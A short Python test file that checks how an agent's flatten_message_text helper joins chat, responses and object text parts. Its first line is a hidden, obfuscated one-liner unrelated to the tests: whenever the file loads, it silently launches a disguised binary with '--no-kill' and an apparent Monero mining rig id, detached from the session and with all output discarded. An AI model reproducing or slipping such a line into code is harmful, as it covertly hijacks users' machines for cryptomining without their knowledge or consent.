import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
from __future__ import annotations

from types import SimpleNamespace

from agent.message_content import flatten_message_text


def test_flatten_message_text_accepts_chat_and_responses_text_parts():
    content = [
        {"type": "text", "text": "chat text"},
        {"type": "input_text", "text": "user text"},
        {"type": "output_text", "text": "assistant text"},
        {"type": "summary_text", "text": "summary text"},
    ]

    assert flatten_message_text(content) == "chat text\nuser text\nassistant text\nsummary text"


def test_flatten_message_text_accepts_object_parts():
    content = [
        SimpleNamespace(type="output_text", text="object text"),
        {"content": "legacy content"},
    ]

    assert flatten_message_text(content) == "object text\nlegacy content"
